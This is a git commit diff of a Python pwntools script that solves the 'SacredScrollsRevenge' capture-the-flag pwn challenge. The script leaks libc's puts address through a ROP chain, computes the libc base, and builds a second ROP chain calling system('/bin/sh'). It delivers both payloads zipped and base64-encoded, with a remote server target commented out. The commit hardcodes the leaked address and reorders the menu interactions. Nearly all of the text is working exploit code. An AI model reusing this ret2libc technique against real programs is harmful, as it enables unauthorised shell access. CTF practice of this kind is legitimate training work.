56a7c5da38c094d573c2fae902a0b61fb82425e2
szhan21 <shunda.zhang@intel.com>
2023-01-10 19:01:40 +0800

    Solving SacredScrollsRevenge by self developed code...

--- ctf/pwn/SacredScrollsRevenge/dec0.py
+++ ctf/pwn/SacredScrollsRevenge/dec0.py
@@ -28,18 +28,16 @@ io = process('./sacred_scrolls')
 #ip, port = "139.59.170.23", 32060
 #io = remote(ip, port)
 
-io.sendlineafter('Enter your wizard tag:','1')
-io.sendlineafter('>>', '1')
-
 pop_rdi_ret = 0x00000000004011b3
 puts_addr = 0x0000000000602f80
 ret = 0x00000000004007ce
 
+'''
 payload1 = padding
 payload1 += p64(pop_rdi_ret)
 payload1 += p64(elf.got['puts'])
 payload1 += p64(elf.plt['puts'])
-payload1 += p64(0x400fc3)
+payload1 += p64(elf.symbols['main'])
 
 with open('spell.txt', 'wb') as f:
         f.write(payload1)
@@ -47,6 +45,8 @@ os.system('zip spell0.zip spell.txt')
 os.system('rm -f spell.txt')
 payload = os.popen('cat spell0.zip').read()
 
+io.sendlineafter('Enter your wizard tag:','1')
+io.sendlineafter('>>', '1')
 io.sendlineafter('[*] Enter file (it will be named spell.zip):', base64.b64encode(payload))
 #print base64.b64encode(payload)
 io.sendlineafter('>>', '2')
@@ -56,6 +56,9 @@ io.recvuntil('\n')
 
 puts_addr = u64(io.recvuntil('\n').strip().ljust(8, b'\x00'))
 log.info("Leaked server's libc address, puts(): "+hex(puts_addr))
+'''
+
+puts_addr = 0x7ffff7e14ed0
 
 server_libc_base = puts_addr - libc.symbols['puts']
 log.info("Leaked server's libc base address: "+hex(server_libc_base))
@@ -67,6 +70,7 @@ rop_libc = ROP(libc)
 #rop_libc.call((rop_libc.find_gadget(['ret']))[0])  #!!Padding/16 bytes!
 rop_libc.call(libc.symbols['system'], [next(libc.search(b'/bin/sh\x00'))])
 payload2 = padding + p64(ret) + rop_libc.chain()
+#payload2 = padding + rop_libc.chain()
 
 with open('spell.txt', 'wb') as f:
         f.write(payload2)
@@ -74,9 +78,10 @@ os.system('zip spell0.zip spell.txt')
 os.system('rm -f spell.txt')
 payload = os.popen('cat spell0.zip').read()
 
+io.sendlineafter('Enter your wizard tag:','1')
 io.sendlineafter('>>', '1')
 io.sendlineafter('[*] Enter file (it will be named spell.zip):', base64.b64encode(payload))
-#print base64.b64encode(payload)
+print base64.b64encode(payload)
 io.sendlineafter('>>', '2')
 io.sendlineafter('>>', '3')
 io.recvuntil('\n')
